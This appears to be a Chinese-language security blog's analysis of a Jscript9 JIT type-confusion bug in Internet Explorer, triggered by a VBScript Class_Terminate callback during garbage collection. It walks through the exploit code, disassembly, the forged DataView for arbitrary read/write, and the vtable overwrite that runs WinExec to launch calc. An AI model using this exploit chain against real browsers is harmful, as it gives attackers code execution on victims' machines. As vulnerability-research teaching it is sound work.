[{"title":"Jscript9 GC JIT Calc","url":"/Jscript9%20GC%20JIT%20Calc/","content":"<h2 id=\"0x0-概述\"><a href=\"#0x0-概述\" class=\"headerlink\" title=\"0x0 概述\"></a>0x0 概述</h2><p>漏洞样本来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2d1aGUxMjAvYnJvd3Nlci9ibG9iL21hc3Rlci9HQy9qaXRfY2FsYy5odG1s\">yuki chen的github<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>漏洞成因：由于JavaScript中的垃圾回收流程内，可以通过VBScript Class_Terminator触发回调，而JIT引擎未考虑到这一点。因此在JIT代码中可以通过这种方式触发回调。</p>\n<p>并且由于Jscript9对下方代码时进行JIT优化时，会触发冗余消除机制: </p>\n<pre><code>...\narr[1,2,3]\nb = arr[0]\n...\nc = arr[1]\n...\n</code></pre>\n<p>优化后的代码访问arr[0]和arr[1]两个成员时，由于冗余消除机制，只会检查arr对象的类型一次，借此就能通过在jit代码中触发垃圾回收进而触发回调，在回调中修改arr对象成员的类型实现类型混淆，进而获得完整exploit。</p>\n<blockquote>\n<p>saelo在<span class=\"exturl\" data-url=\"aHR0cDovL3BocmFjay5vcmcvcGFwZXJzL2ppdF9leHBsb2l0YXRpb24uaHRtbA==\">The Art of Exploitation<i class=\"fa fa-external-link-alt\"></i></span>中提到了该机制。</p>\n</blockquote>\n<h2 id=\"0x1-漏洞分析\"><a href=\"#0x1-漏洞分析\" class=\"headerlink\" title=\"0x1 漏洞分析\"></a>0x1 漏洞分析</h2><h3 id=\"1-force-to-optimize\"><a href=\"#1-force-to-optimize\" class=\"headerlink\" title=\"1.force to optimize\"></a><strong>1.force to optimize</strong></h3><p>下方代码的功能为强制触发JIT优化:</p>\n<pre><code>var a = [1, 2, 3];\nstop = true;\n\nfor (var i = 0; i &lt; 10000; ++i)\n    func(a, [&#123;&#125;, &#123;&#125;]);\n</code></pre>\n<p>循环过程中触发JIT优化，优化完成后解释执行函数入口被修改为JIT函数入口，为后续利用做准备。</p>\n<h3 id=\"2-using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC\"><a href=\"#2-using-VBScript-Class-Terminator-to-trigger-Callback-in-JavaScript-GC\" class=\"headerlink\" title=\"2.using VBScript Class_Terminator to trigger Callback in JavaScript GC\"></a><strong>2.using VBScript Class_Terminator to trigger Callback in JavaScript GC</strong></h3><p>下方代码在vbscript中创建了类cla0，并且在其Class_Terminate回调中调用了JavaScript中的函数：</p>\n<pre><code>&lt;script type=&quot;text/vbscript&quot;&gt;\n\nDim o\nClass cla0\nPrivate Sub Class_Terminate\n    call ff\nEnd Sub\nEnd Class\n\nSet o = new cla0\n\n&lt;/script&gt;\n</code></pre>\n<p>此处代码作用为：在JavaScript中引用vbscript对象，再消除其引用，使用setTimeout调用函数触发垃圾回收时，最终会执行JavaScript中的ff函数，在其中就可以利用概述中提到的特性进行类型混淆。</p>\n<blockquote>\n<p>使用setTimeout调用函数是为了离开当前作用域以消除当前作用域对vbscript对象的引用，因此此处代码和强制触发JIT优化处为一个作用域，main函数在另一个。</p>\n</blockquote>\n<pre><code>arr.push(o);\no = null;\narr[0] = null;\n\nsetTimeout(main, 1);\n</code></pre>\n<h3 id=\"3-Type-Confusion\"><a href=\"#3-Type-Confusion\" class=\"headerlink\" title=\"3.Type Confusion\"></a><strong>3.Type Confusion</strong></h3><p>下面是main函数中调用func函数部分代码，与func函数实现:</p>\n<pre><code>var u32 = new Uint32Array(10);\nvar ga = new Array(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);\nvar fo = new Array(&#123;&#125;, &#123;&#125;, &#123;&#125;);\n\nfunction func(arr, a2) &#123;\n    arr[0] = 1;\n    var bb = &#123; p0: 1, p1: 1, p2: 1, p3: 1,...,p2866: 1 &#125;;//省略了中间的代码\n\n    if (!stop)\n        return;\n\n    a2[1] = ga;\n    a2[2] = fo;\n    arr[0] = arr[1] + 0x38;\n    u32[0] = arr[1];\n    u32[1] = arr[2];\n    arr[1] = 1;\n&#125;\n\nfunction main() &#123;\n    ...\n    ggg = a;\n    for (; i &lt; 0x100000 &amp;&amp; !stop; ++i) &#123;\n        func(a, a);\n    &#125;\n    ...\n&#125;\n</code></pre>\n<p>在强制触发JIT优化时，和main()函数中对func函数的调用区别在于第二参数，之前是[{}, {}]，此次为[1, 2, 3]。</p>\n<p>由于第一次调用时func函数的第二参数为Object数组，JIT生成的汇编代码会直接以Object方式去访问a2的成员。</p>\n<p>不断调用func()函数创建bb对象，在内存耗尽后为bb对象申请内存时，会触发GC以回收未使用的内存。</p>\n<p>GC过程中清理了vbscript对象o，继而执行Class_Terminate调用JavaScript函数ff，其代码如下:</p>\n<pre><code>function ff() &#123;\n    ggg[0] = &#123;&#125;;\n    stop = true;\n&#125;\n</code></pre>\n<p>可以看到在其中将a[0]更改为了object类型，并设置stop为true，这样在此次bb对象申请内存完毕后，就可以绕过检查实现类型混淆。</p>\n<h4 id=\"func函数JIT后的关键代码：\"><a href=\"#func函数JIT后的关键代码：\" class=\"headerlink\" title=\"func函数JIT后的关键代码：\"></a>func函数JIT后的关键代码：</h4><p>首先访问arr[0]，赋值前检查对象类型，此处检查过后，后续就不会再检查其类型是否正确</p>\n<pre><code>1c0d0000    push    ebp\n1c0d0001    mov     ebp, esp\n...\n1c0d005c    mov     esi, dword ptr [ebp+14h]\n1c0d005f    mov     eax, 0\n1c0d0064    test    esi, 1\n1c0d006a    jne     1c0d945a\n1c0d0070    cmovne  esi, esi\n1c0d0073    mov     eax, 0\n1c0d0078    cmp     dword ptr [esi], offset jscript9!Js::JavascriptNativeIntArray::`vftable&#39; (71362358)\n</code></pre>\n<p>接着为bb对象申请所需内存，内存耗尽后触发GC，继而执行ff函数修改了对象a的类型，设置stop为true</p>\n<pre><code>...\n1c0d00be    call    jscript9!Js::JavascriptOperators::NewScObjectMemContext (71432530)\n初始化bb对象...\n</code></pre>\n<p>由于stop被修改，此处代码继续向下执行</p>\n<pre><code>1c0d9220    cmp     eax, 1\n1c0d9223    jmp     1c0d9239\n1c0d9228    cmp     dword ptr [eax], offset jscript9!Js::JavascriptBoolean::`vftable&#39; (71375c54)\n            ; if (!stop) return;\n1c0d922e    jne     1c0d9551\n1c0d9234    cmp     eax, 11E3B670h\n1c0d9239    jne     1c0d9249\n1c0d923f    mov     edi, 11E3BFE0h\n1c0d9244    jmp     1c0d943a\n</code></pre>\n<p>访问a2[1]: 由于在main函数中，调用func函数时两个参数都是a对象，而在GC中调用ff函数后，a[0]（ggg[0]）已经从<strong>JavascriptNativeIntArray</strong>被修改为了<strong>JavascriptArray</strong>，此时就实现了对arr对象的类型混淆。</p>\n<pre><code>...\n1c0d9255    mov     ecx, 0\n1c0d925a    test    bl, 1\n1c0d925d    jne     1c0d9563\n1c0d9263    cmovne  ebx, ebx\n1c0d9266    mov     ecx, 0\n1c0d926b    cmp     dword ptr [ebx], offset jscript9!Js::JavascriptArray::`vftable&#39; (713638c0)\n</code></pre>\n<p>a2[1] = ga: 此处直接将ga对象地址放入了<strong>JavascriptArray</strong>的buffer中，fo对象地址也以同样的方式被放入a2[2]。</p>\n<pre><code>...\n1c0d9249    mov     eax, dword ptr ds:[11E36208h]   ;eax: ga address\n1c0d924f    mov     eax, dword ptr [eax+5B4h]\n...\n1c0d9284    mov     ecx, dword ptr [ebx+14h]        ;ebx: a2 address \n1c0d9287    cmp     dword ptr [ecx+4], 1\n1c0d928b    jbe     1c0d958b\n1c0d9291    mov     edx, 1\n1c0d9296    sub     edx, dword ptr [ecx+4]\n1c0d9299    sar     edx, 1Fh\n1c0d929c    lea     ecx, [ecx+14h]\n1c0d929f    and     ecx, edx\n1c0d92a1    mov     dword ptr [ecx], eax\n...\n</code></pre>\n<p>arr[0] = arr[1] + 0x38: 由于类型混淆，arr以int值取出了ga对象地址，并从中取出了ga对象的buffer地址(类型为<strong>JavascriptNativeIntArray</strong>，array buffer位于+38h处)。</p>\n<pre><code>...\n1c0d92db    mov     ecx, 1\n1c0d92e0    sub     ecx, dword ptr [eax+4]\n1c0d92e3    sar     ecx, 1Fh\n1c0d92e6    mov     ebx, dword ptr [eax+14h]\n1c0d92e9    and     ebx, ecx\n1c0d92eb    mov     eax, ebx\n1c0d92ed    add     eax, 38h\n1c0d92f0    jo      1c0d96e3\n1c0d92f6    mov     ecx, dword ptr [esi+14h]        ;esi: arr address\n1c0d92f9    cmp     dword ptr [ecx+4], 0\n1c0d92fd    jbe     1c0d96f2\n1c0d9303    xor     edx, edx\n1c0d9305    sub     edx, dword ptr [ecx+4]\n1c0d9308    sar     edx, 1Fh\n1c0d930b    lea     ecx, [ecx+10h]\n1c0d930e    and     ecx, edx\n1c0d9310    mov     dword ptr [ecx], eax            ;arr[0] = ga address + 0x38\n...\n</code></pre>\n<p>最后将获得的地址放入u32中后返回，其类型为**TypedArray&lt;unsigned int,0&gt;**，方便后续使用。</p>\n<h2 id=\"0x2-利用分析\"><a href=\"#0x2-利用分析\" class=\"headerlink\" title=\"0x2 利用分析\"></a>0x2 利用分析</h2><p>通过类型混淆获得了对象地址后，接下来就是一般的利用流程了。</p>\n<p>在泄露了地址的ga对象buffer中伪造一个DataView对象：</p>\n<pre><code>ga_addr = u32[0];\nfo_addr = u32[1];\n\ndv_addr = ga_addr + 0x38;\n\nga[0] = 0x2e;\nga[1] = dv_addr;\nga[2] = dv_addr - 0x210;\nga[3] = 0;\nga[4] = ga_addr + 0x24;\nga[5] = 0;\nga[6] = -1;\nga[7] = dv_addr;\n</code></pre>\n<p>这里通过封装DataView.prototype.getUint32.call实现了读取任意地址。当前伪造的DataView是没有虚表的，这里通过调用prototype的虚函数（即Js::DataView::EntryGetUint32，上方伪造的DataView成员值是为了绕过该函数中的检查）来绕过对伪造的DataView虚表的访问</p>\n<pre><code>function read32(addr) &#123;\n    if (addr &gt;= 0x80000000) &#123;\n        addr = -(0x100000000 - addr);\n    &#125;\n    ga[0x1c / 4] = addr;\n    return DataView.prototype.getUint32.call(dv, 0, true);\n\n&#125;\n</code></pre>\n<p>从正确的DataView对象中取出Type字段，填充进伪造的DataView对象内。</p>\n<blockquote>\n<p>不修改该字段获取target_arr地址过程中会报错</p>\n</blockquote>\n<pre><code>dv = a[0];\nvar rdv = new DataView(new ArrayBuffer(8));\nvar rtype = readPointer(leakObjectAddress(rdv) + 4);\n\n// Fix fake DataView-&gt;type\nga[0x04 / 4] = rtype;\n\nvar space = new DataView(new ArrayBuffer(0x200));\nvar space_addr = readPointer(leakObjectAddress(space) + 0x1c);\n\nvar fake_vtable_addr = space_addr;\nvar cmd_addr = space_addr + 0x100;\n</code></pre>\n<p>再次泄露一个<strong>JavascriptNativeIntArray</strong>对象地址从其虚表获得jscript9基地址，继而获得Winexec地址。</p>\n<pre><code>var target_arr = new Array(1, 2, 3, 4, 5);\nvar target_arr_addr = leakObjectAddress(target_arr);\njscript9_base = getModuleBase(readPointer(target_arr_addr));\nkernel32_base = getModuleBaseFromIAT(jscript9_base, &#39;KERNEL32&#39;);\n\nvar winexec = getProcAddress(kernel32_base, &#39;WinExec&#39;);\n</code></pre>\n<p>最后修改了target_arr_addr对象的虚表地址，将Winexec函数指针放在伪造虚表的+0x7c处，调用对应虚函数（<strong>Js::JavascriptNativeIntArray::HasItem</strong>）后弹出计算器。</p>\n<pre><code>write32(target_arr_addr, fake_vtable_addr);\nwrite32(fake_vtable_addr + 0x7C, winexec);\n\nwriteString(cmd_addr, &#39;calc&#39;);\n\nif (cmd_addr in target_arr) &#123; &#125;\n</code></pre>\n<h2 id=\"0x3-总结\"><a href=\"#0x3-总结\" class=\"headerlink\" title=\"0x3 总结\"></a>0x3 总结</h2><p>该漏洞是一个逻辑漏洞，因此利用十分稳定，个人觉得可以通过该漏洞入门JIT优化错误类漏洞。</p>\n"},{"title":"404","url":"//404.html","content":"<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">██╗  ██╗ ██████╗ ██╗  ██╗    ███╗   ██╗ ██████╗ ████████╗</span><br><span class=\"line\">██║  ██║██╔═████╗██║  ██║    ████╗  ██║██╔═══██╗╚══██╔══╝</span><br><span class=\"line\">███████║██║██╔██║███████║    ██╔██╗ ██║██║   ██║   ██║</span><br><span class=\"line\">╚════██║████╔╝██║╚════██║    ██║╚██╗██║██║   ██║   ██║</span><br><span class=\"line\">     ██║╚██████╔╝     ██║    ██║ ╚████║╚██████╔╝   ██║</span><br><span class=\"line\">     ╚═╝ ╚═════╝      ╚═╝    ╚═╝  ╚═══╝ ╚═════╝    ╚═╝</span><br><span class=\"line\"></span><br><span class=\"line\">    ███████╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗</span><br><span class=\"line\">    ██╔════╝██╔═══██╗██║   ██║████╗  ██║██╔══██╗</span><br><span class=\"line\">    █████╗  ██║   ██║██║   ██║██╔██╗ ██║██║  ██║</span><br><span class=\"line\">    ██╔══╝  ██║   ██║██║   ██║██║╚██╗██║██║  ██║</span><br><span class=\"line\">    ██║     ╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝</span><br><span class=\"line\">    ╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝</span><br></pre></td></tr></table></figure>\n"}]